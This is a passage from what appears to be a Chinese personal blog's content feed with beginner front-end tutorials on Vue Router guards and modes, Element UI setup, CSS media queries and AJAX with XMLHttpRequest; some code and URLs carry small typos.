class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">            component:Home</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//全局前置守卫：初始化时执行、每次路由切换前执行</span></span><br><span class="line"><span class="comment">//to:要跳转到哪个路径from:从哪个路径跳过来的next:放行，可以通过的</span></span><br><span class="line">router.beforeEach(<span class="function">(<span class="params">to,<span class="keyword">from</span>,next</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;beforeEach&#x27;</span>,to,<span class="keyword">from</span>)</span><br><span class="line">    <span class="keyword">if</span>(to.meta.isAuth)&#123; <span class="comment">//判断当前路由是否需要进行权限控制</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">localStorage</span>.getItem(<span class="string">&#x27;school&#x27;</span>) === <span class="string">&#x27;atguigu&#x27;</span>)&#123; <span class="comment">//权限控制的具体规则</span></span><br><span class="line">            next() <span class="comment">//放行</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            alert(<span class="string">&#x27;暂无权限查看&#x27;</span>)</span><br><span class="line">            <span class="comment">// next(&#123;name:&#x27;guanyu&#x27;&#125;)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        next() <span class="comment">//放行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//全局后置守卫：初始化时执行、每次路由切换后执行</span></span><br><span class="line">router.afterEach(<span class="function">(<span class="params">to,<span class="keyword">from</span></span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;afterEach&#x27;</span>,to,<span class="keyword">from</span>)</span><br><span class="line">    <span class="keyword">if</span>(to.meta.title)&#123; </span><br><span class="line">        <span class="built_in">document</span>.title = to.meta.title <span class="comment">//修改网页的title</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.title = <span class="string">&#x27;vue_test&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>独享守卫:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建并暴露一个路由器</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">    mode:<span class="string">&#x27;hash&#x27;</span>,<span class="comment">//默认时hash,另一个是history</span></span><br><span class="line">    routes:[</span><br><span class="line">        &#123;</span><br><span class="line">            name:<span class="string">&#x27;guanyu&#x27;</span>,</span><br><span class="line">            path:<span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">            component:About,</span><br><span class="line">            <span class="comment">//需要验证的权限，可以向meta对象中添加数据，key的名字可以随便取</span></span><br><span class="line">            meta:&#123;isAuth;<span class="literal">true</span>&#125;，</span><br><span class="line">            <span class="function"><span class="title">beforeEnter</span>(<span class="params">to,<span class="keyword">from</span>,next</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;beforeEnter&#x27;</span>,to,<span class="keyword">from</span>)</span><br><span class="line">    <span class="keyword">if</span>(to.meta.isAuth)&#123; <span class="comment">//判断当前路由是否需要进行权限控制</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">localStorage</span>.getItem(<span class="string">&#x27;school&#x27;</span>) === <span class="string">&#x27;atguigu&#x27;</span>)&#123;</span><br><span class="line">        next()</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        alert(<span class="string">&#x27;暂无权限查看&#x27;</span>)</span><br><span class="line">        <span class="comment">// next(&#123;name:&#x27;guanyu&#x27;&#125;)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    next()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        path:<span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">            component:Home</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>组件内守卫：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//组件是about，进入about组件时会调用beforeRouteEnter函数，离开about组件时会调用beforeRouteLeave函数</span></span><br><span class="line"><span class="comment">//进入守卫：通过路由规则，进入该组件时被调用</span></span><br><span class="line">beforeRouteEnter (to, <span class="keyword">from</span>, next) &#123;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">//离开守卫：通过路由规则，离开该组件时被调用</span></span><br><span class="line">beforeRouteLeave (to, <span class="keyword">from</span>, next) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="路由器的两种工作模式"><a href="#路由器的两种工作模式" class="headerlink" title="路由器的两种工作模式"></a>路由器的两种工作模式</h3><ol><li>对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值。</li><li>hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器。</li><li>hash模式：<ol><li>地址中永远带着#号，不美观 。</li><li>若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。</li><li>兼容性较好。</li></ol></li><li>history模式：<ol><li>地址干净，美观 。</li><li>兼容性和hash模式相比略差。</li><li>应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。</li></ol></li></ol><h1 id="Vue-UI组件库"><a href="#Vue-UI组件库" class="headerlink" title="Vue UI组件库"></a>Vue UI组件库</h1><p><strong>移动端常用U川组件库</strong></p><ol><li>Vant：<a href="https://youzan.github.io/vante">https://youzan.github.io/vante</a></li><li>Cube Ul：<a href="https://didi.github.io/cube-uie">https://didi.github.io/cube-uie</a></li><li>Mint Ul：<a href="http://mint-ui.github.io">http://mint-ui.github.io</a></li></ol><p><strong>PC端常用U1组件库</strong></p><ol><li>Element Ul：<a href="https://element.eleme.cne">https://element.eleme.cne</a></li><li>IView Ul：<a href="https://www.iviewui.come">https://www.iviewui.come</a></li></ol><h3 id="Element-Ul"><a href="#Element-Ul" class="headerlink" title="Element Ul"></a>Element Ul</h3><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i element-ui</span><br></pre></td></tr></table></figure><p>完整引入，在 main.js 中写入以下内容：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ElementUI <span class="keyword">from</span> <span class="string">&#x27;element-ui&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;element-ui/lib/theme-chalk/index.css&#x27;</span>;</span><br><span class="line">Vue.use(ElementUI);</span><br></pre></td></tr></table></figure><p>按需导入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install babel-plugin-component -D &#x2F;&#x2F;-D表示开发版的</span><br></pre></td></tr></table></figure><p>然后，将 .babelrc/babel.config.js修改为：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;presets&quot;</span>: [[<span class="string">&quot;es2015&quot;</span>, &#123; <span class="attr">&quot;modules&quot;</span>: <span class="literal">false</span> &#125;]],</span><br><span class="line">  <span class="attr">&quot;plugins&quot;</span>: [</span><br><span class="line">    [</span><br><span class="line">      <span class="string">&quot;component&quot;</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">&quot;libraryName&quot;</span>: <span class="string">&quot;element-ui&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;styleLibraryName&quot;</span>: <span class="string">&quot;theme-chalk&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line">注意：是.babelrc文件，则&quot;presets&quot;: [[&quot;es2015&quot;, &#123; &quot;modules&quot;: false &#125;]]</span><br><span class="line"> 是.babel.config.js文件，则&quot;presets&quot;: [[&quot;@babel/preset-env&quot;, &#123; &quot;modules&quot;: false &#125;]]</span><br></pre></td></tr></table></figure><p>main文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Button &#125; <span class="keyword">from</span>  <span class="string">&#x27;element-ui&#x27;</span></span><br><span class="line">Vue.use(Button)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>什么是媒体查询？</title>
      <link href="blog/media/"/>
      <url>blog/media/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="什么是媒体查询"><a href="#什么是媒体查询" class="headerlink" title="什么是媒体查询"></a>什么是媒体查询</h2><blockquote><p>媒体查询（Media Query）是CSS3新语法。</p></blockquote><ul><li>使用@media查询，可以针对不同的媒体类型定义不同的样式</li><li>@media可以针对不同的屏幕尺寸设置不同的样式</li><li>当你重置浏览器大小的过程中，页面也会根据浏览器的宽度和高度重新渲染页面</li><li>目前针对很多苹果手机、Android手机，平板等设备都用得到媒体查询</li></ul><h2 id="语法规范"><a href="#语法规范" class="headerlink" title="语法规范"></a>语法规范</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@media</span> mediatype <span class="keyword">and</span>|<span class="keyword">not</span>|<span class="keyword">only</span> (media feature)&#123;</span><br><span class="line">      <span class="selector-tag">css-code</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>用@media开通 注意@符号</li><li>mediatype 媒体类型</li><li>关键字 and not only</li><li>media feature 媒体特性，必须有小括号包含</li></ul><h3 id="mediatype查询类型"><a href="#mediatype查询类型" class="headerlink" title="mediatype查询类型"></a>mediatype查询类型</h3><blockquote><p>将不同的终端设备划分为不同的类型，称为媒体类型</p></blockquote><div class="table-container"><table><thead><tr><th style="text-align:center">值</th><th style="text-align:center">解释说明</th></tr></thead><tbody><tr><td style="text-align:center">all</td><td style="text-align:center">用于所有设备</td></tr><tr><td style="text-align:center">print</td><td style="text-align:center">用于打印机和打印预览</td></tr><tr><td style="text-align:center">scree</td><td style="text-align:center">用于电脑屏幕，平板电脑，智能手机等</td></tr></tbody></table></div><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><blockquote><p>关键字将媒体类型或多个特性连接到一起做为媒体查询的条件</p></blockquote><ul><li>and：可以将多个媒体特性连接到一起，相当”且”于的意思</li><li>not：排除某个媒体类型，相当于”非”的意思，可以省略</li><li>only：指定某个特定的媒体类型，可省略</li></ul><h3 id="媒体特性"><a href="#媒体特性" class="headerlink" title="媒体特性"></a>媒体特性</h3><blockquote><p>每种媒体类型都具备各自不同的特性，根据不同媒体类型特性设置不同的展示风格，简单先了解三个</p></blockquote><p><strong>注意</strong>：他们要加小括号包含</p><div class="table-container"><table><thead><tr><th style="text-align:center">值</th><th style="text-align:center">解释说明</th></tr></thead><tbody><tr><td style="text-align:center">wudth</td><td style="text-align:center">定义输出设备中页面可见区域宽度</td></tr><tr><td style="text-align:center">min-width</td><td style="text-align:center">定义输出设备中页面最小可见区域宽度</td></tr><tr><td style="text-align:center">max-width</td><td style="text-align:center">定义输出设备中页面最大可见区域宽度</td></tr></tbody></table></div><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">style</span>&gt;</span><br><span class="line"><span class="comment">/*这句话的意思是当宽度小于800X时，背景颜色会改变*/</span></span><br><span class="line"><span class="comment">/*媒体查询会根据不同的屏幕尺寸来设置不同的样式*/</span></span><br><span class="line"><span class="selector-tag">dmedia</span> <span class="selector-tag">screen</span> <span class="selector-tag">and</span> (<span class="selector-tag">max-width</span><span class="selector-pseudo">:800px)</span>&#123;</span><br><span class="line">    body&#123;</span><br><span class="line">        <span class="selector-tag">background-color</span>:<span class="selector-id">#fd8040</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="引入资源"><a href="#引入资源" class="headerlink" title="引入资源"></a>引入资源</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">style</span>&gt;</span><br><span class="line"><span class="comment">/*当我们屏幕大于等于640px以上的，我们让div一行显示2个*/</span></span><br><span class="line"><span class="comment">/*当我们屏幕小于640我们让div一行显示一个*/</span></span><br><span class="line"><span class="comment">/*一个建议：我们媒体查询最好的方法是从小到大*/</span></span><br><span class="line"><span class="comment">/*引入资源就是针对于不同的屏幕尺寸调用不同的css文件*/</span></span><br><span class="line">&lt;/<span class="selector-tag">style</span>&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot;href=&quot;style320.css&quot; media=&quot;screen and (min-width:320px)&quot;&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot;href=&quot;style640.css&quot; media=&quot;screen and (min-width:640px)&quot;&gt;</span><br><span class="line">&lt;/<span class="selector-tag">head</span>&gt;</span><br><span class="line">&lt;<span class="selector-tag">body</span></span><br><span class="line">&lt;<span class="selector-tag">div</span>&gt;1&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line">&lt;<span class="selector-tag">div</span>&gt;2&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line">&lt;/<span class="selector-tag">body</span>&gt;</span><br><span class="line">&lt;/<span class="selector-tag">html</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="rem和媒体查询结合用"><a href="#rem和媒体查询结合用" class="headerlink" title="rem和媒体查询结合用"></a>rem和媒体查询结合用</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*从小到大的顺序*/</span></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">min-width:</span><span class="number">320px</span>)&#123;</span><br><span class="line">    <span class="selector-tag">html</span>&#123;</span><br><span class="line">        <span class="attribute">font-size</span>:<span class="number">50px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">min-width:</span><span class="number">640px</span>)&#123;</span><br><span class="line">    <span class="selector-tag">html</span>&#123;</span><br><span class="line">        <span class="attribute">font-size</span>:<span class="number">100px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.top</span>&#123;</span><br><span class="line">        <span class="attribute">height</span>:<span class="number">1rem</span>;</span><br><span class="line">        <span class="attribute">font-size</span>:.<span class="number">5rem</span>;</span><br><span class="line">        <span class="attribute">background-color</span>:green;</span><br><span class="line">        co1or:■#fff;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>你该不会还不知道什么是Ajax吧？</title>
      <link href="blog/Ajax/"/>
      <url>blog/Ajax/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>AJax</strong></p><h1 id="什么是-AJAX？"><a href="#什么是-AJAX？" class="headerlink" title="什么是 AJAX？"></a>什么是 AJAX？</h1><p>AJAX = <em>A</em>synchronous <em>J</em>avaScript <em>A</em>nd <em>X</em>ML.</p><p>AJAX 并非编程语言。</p><p>AJAX 仅仅组合了：</p><ul><li>浏览器内建的 XMLHttpRequest 对象（从 web 服务器请求数据）</li><li>JavaScript 和 HTML DOM（显示或使用数据）</li></ul><p>Ajax 是一个令人误导的名称。Ajax 应用程序可能使用 XML 来传输数据，但将数据作为纯文本或 JSON 文本传输也同样常见。</p><p>Ajax 允许通过与场景后面的 Web 服务器交换数据来异步更新网页。这意味着可以<strong>更新网页的部分，而不需要重新加载整个页面。</strong></p><p>Ajax的缺点：</p><ol><li>没有浏览历史，不能回退</li><li>存在跨域问题（同源）</li><li>SEO不友好</li></ol><h1 id="AJAX-如何工作"><a href="#AJAX-如何工作" class="headerlink" title="AJAX 如何工作"></a>AJAX 如何工作</h1><p><img src="ajax.gif" alt=""></p><ol><li>网页中发生一个事件（页面加载、按钮点击）</li><li>由 JavaScript 创建 XMLHttpRequest 对象</li><li>XMLHttpRequest 对象向 web 服务器发送请求</li><li>服务器处理该请求</li><li>服务器将响应发送回网页</li><li>由 JavaScript 读取响应</li><li>由 JavaScript 执行正确的动作（比如更新页面）</li></ol><h1 id="AJAX-XMLHttpRequest-对象"><a href="#AJAX-XMLHttpRequest-对象" class="headerlink" title="AJAX - XMLHttpRequest 对象"></a>AJAX - XMLHttpRequest 对象</h1><p>所有现代浏览器都支持 XMLHttpRequest 对象。</p><p>XMLHttpRequest 对象用于同幕后服务器交换数据。这意味着可以更新网页的部分，而不需要重新加载整个页面。</p><h3 id="创建-XMLHttpRequest-对象"><a href="#创建-XMLHttpRequest-对象" class="headerlink" title="创建 XMLHttpRequest 对象"></a>创建 XMLHttpRequest 对象</h3><p>为了应对所有浏览器，包括 IE5 和 IE6，请检查浏览器是否支持 XMLHttpRequest 对象。如果支持，创建 XMLHttpRequest 对象，如果不支持，则创建 ActiveX 对象：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line"><span class="keyword">var</span> xhttp;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">    xhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// code for IE6, IE5</span></span><br><span class="line">    xhttp = <span class="keyword">new</span> ActiveXObject(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="跨域访问"><a href="#跨域访问" class="headerlink" title="跨域访问"></a>跨域访问</h3><p>出于安全原因，现代浏览器不允许跨域访问。</p><p>这意味着尝试加载的网页和 XML 文件都必须位于相同服务器上。</p><h3 id="MLHttpRequest-对象方法"><a href="#MLHttpRequest-对象方法" class="headerlink" title="MLHttpRequest 对象方法"></a>MLHttpRequest 对象方法</h3><div class="table-container"><table><thead><tr><th style="text-align:left">方法</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">new XMLHttpRequest()</td><td style="text-align:left">创建新的 XMLHttpRequest 对象</td></tr><tr><td style="text-align:left">abort()</td><td style="text-align:left">取消当前请求</td></tr><tr><td style="text-align:left">getAllResponseHeaders()</td><td style="text-align:left">返回头部信息</td></tr><tr><td style="text-align:left">getResponseHeader()</td><td style="text-align:left">返回特定的头部信息</td></tr><tr><td style="text-align:left">open(<em>method</em>, <em>url</em>, <em>async</em>, <em>user</em>, <em>psw</em>)</td><td style="text-align:left">规定请求method：请求类型 GET 或 POST url：文件位置 async：true（异步）或 false（同步）user：可选的用户名称psw：可选的密码</td></tr><tr><td style="text-align:left">send()</td><td style="text-align:left">将请求发送到服务器，用于 GET 请求</td></tr><tr><td style="text-align:left">send(<em>string</em>)</td><td style="text-align:left">将请求发送到服务器，用于 POST 请求</td></tr><tr><td style="text-align:left">setRequestHeader()</td><td style="text-align:left">向要发送的报头添加标签/值对</td></tr></tbody></table></div><h3 id="XMLHttpRequest-对象属性"><a href="#XMLHttpRequest-对象属性" class="headerlink" title="XMLHttpRequest 对象属性"></a>XMLHttpRequest 对象属性</h3><div class="table-container"><table><thead><tr><th style="text-align:left">属性</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">onreadystatechange</td><td style="text-align:left">定义当 readyState 属性发生变化时被调用的函数</td></tr><tr><td style="text-align:left">readyState</td><td style="text-align:left">保存 XMLHttpRequest 的状态。0：请求未初始化1：服务器连接已建立2：请求已收到3：正在处理请求4：请求已完成且响应已就绪</td></tr><tr><td style="text-align:left">responseText</td><td style="text-align:left">以字符串返回响应数据</td></tr><tr><td style="text-align:left">responseXML</td><td style="text-align:left">以 XML 数据返回响应数据</td></tr><tr><td style="text-align:left">status</td><td style="text-align:left">返回请求的状态号200: “OK”403: “Forbidden”404: “Not Found”</td></tr><tr><td style="text-align:left">statusText</td><td style="text-align:left">返回状态文本（比如 “OK” 或 “Not Found”）</td></tr><tr><td style="text-align:left">timeout</td><td style="text-align:left">设置请求时间 xhr.timeout = 2s</td></tr><tr><td style="text-align:left">ontimeout</td><td style="text-align:left">超过请求时间就会回调 xhr.ontimeout = function(){}</td></tr></tbody></table></div><h1 id="AJAX-XMLHttpRequest-请求"><a href="#AJAX-XMLHttpRequest-请求" class="headerlink" title="AJAX - XMLHttpRequest 请求"></a>AJAX - XMLHttpRequest 请求</h1><p><strong>XMLHttpRequest 对象用于同服务器交换数据。</strong></p><h3 id="向服务器发送请求"><a href="#向服务器发送请求" class="headerlink" title="向服务器发送请求"></a>向服务器发送请求</h3><p>如需向服务器发送请求，我们使用 XMLHttpRequest 对象的 <code>open()</code> 和 <code>send()</code> 方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line">xhttp.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;ajax_info.txt&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">xhttp.send();</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th style="text-align:left">方法</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">open(<em>method</em>, <em>url</em>, <em>async</em>)</td><td style="text-align:left">规定请求的类型<em>method</em>：请求的类型：GET 还是 POST <em>url</em>：服务器（文件）位置 <em>async</em>：true（异步）或 false（同步）</td></tr><tr><td style="text-align:left">send()</td><td style="text-align:left">向服务器发送请求（用于 GET）</td></tr><tr><td style="text-align:left">send(<em>string</em>)</td><td style="text-align:left">向服务器发送请求（用于 POST）</td></tr></tbody></table></div><h3 id="GET-还是-POST？"><a href="#GET-还是-POST？" class="headerlink" title="GET 还是 POST？"></a>GET 还是 POST？</h3><p>GET 比 POST 更简单更快，可用于大多数情况下。</p><p>不过，请在以下情况始终使用 POST：</p><ul><li>缓存文件不是选项（更新服务器上的文件或数据库）</li><li>向服务器发送大量数据（POST 无大小限制）</li><li>发送用户输入（可包含未知字符），POST 比 GET 更强大更安全</li></ul><h3 id="GET传参"><a href="#GET传参" class="headerlink" title="GET传参"></a>GET传参</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line">xhttp.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;demo_get2.asp?fname=Bill&amp;lname=Gates&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">xhttp.send();</span><br></pre></td></tr></table></figure><h3 id="POST传参"><a href="#POST传参" class="headerlink" title="POST传参"></a>POST传参</h3><p>如需像 HTML 表单那样 POST 数据，请通过 <code>setRequestHeader()</code> 添加一个 HTTP 头部。请在 <code>send()</code> 方法中规定您需要发送的数据：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line">xhttp.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;ajax_test.asp&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">xhttp.setRequestHeader(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line"><span class="comment">// 以下设置参数的方式都是可以的</span></span><br><span class="line">xhttp.send(<span class="string">&quot;fname=Bill&amp;lname=Gates&quot;</span>);</span><br><span class="line">xhttp.send(<span class="string">&quot;fname:ll&amp;lname:ates&quot;</span>);</span><br><span class="line">xhttp.send(<span class="string">&quot;fnamedfgdfgdfgdf&quot;</span>);</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th style="text-align:left">方法</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">setRequestHeader(<em>header</em>, <em>value</em>)</td><td style="text-align:left">向请求添加 HTTP 头部 <em>header</em>：规定头部名称 <em>value</em>：规定头部值</td></tr></tbody></table></div><p>我们不推荐同步的 XMLHttpRequest (async = false)，因为 JavaScript 将停止执行直到服务器响应就绪。如果服务器繁忙或缓慢，应用程序将挂起或停止。</p><p>同步 XMLHttpRequest 正在从 Web 标准中移除，但是这个过程可能需要很多年。</p><h1 id="AJAX-服务器响应"><a href="#AJAX-服务器响应" class="headerlink" title="AJAX - 服务器响应"></a>AJAX - 服务器响应</h1><h3 id="onreadystatechange-属性"><a href="#onreadystatechange-属性" class="headerlink" title="onreadystatechange 属性"></a>onreadystatechange 属性</h3><p><code>readyState</code> 属性存留 XMLHttpRequest 的状态。</p><p><code>onreadystatechange</code> 属性定义当 readyState 发生变化时执行的函数。</p><p><code>status</code> 属性和 <code>statusText</code> 属性存有 XMLHttpRequest 对象的状态。</p><div class="table-container"><table><thead><tr><th style="text-align:left">属性</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">onreadystatechange</td><td style="text-align:left">定义了当 readyState 属性发生改变时所调用的函数。</td></tr><tr><td style="text-align:left">readyState</td><td style="text-align:left">保存了 XMLHttpRequest 的状态。0: 请求未初始化1: 服务器连接已建立2: 请求已接收3: 正在处理请求4: 请求已完成且响应已就绪</td></tr><tr><td style="text-align:left">status</td><td style="text-align:left">200: “OK”403: “Forbidden”404: “Page not found”</td></tr><tr><td style="text-align:left">statusText</td><td style="text-align:left">返回状态文本（例如 “OK” 或 “Not Found”）</td></tr></tbody></table></div><p><em>每当</em> readyState 发生变化时就会调用 onreadystatechange 函数。</p><h3 id="服务器响应属性"><a href="#服务器响应属性" class="headerlink" title="服务器响应属性"></a>服务器响应属性</h3><div class="table-container"><table><thead><tr><th style="text-align:left">属性</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">responseText</td><td style="text-align:left">获取字符串形式的响应数据</td></tr><tr><td style="text-align:left">responseXML</td><td style="text-align:left">获取 XML 数据形式的响应数据</td></tr></tbody></table></div><h5 id="responseText-属性"><a href="#responseText-属性" class="headerlink" title="responseText 属性"></a>responseText 属性</h5><p><code>responseText</code> 属性以 JavaScript 字符串的形式返回服务器响应，因此您可以这样使用它：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;demo&quot;</span>).innerHTML = xhttp.responseText;</span><br></pre></td></tr></table></figure><h5 id="responseXML-属性"><a href="#responseXML-属性" class="headerlink" title="responseXML 属性"></a>responseXML 属性</h5><p>XML HttpRequest 对象有一个內建的 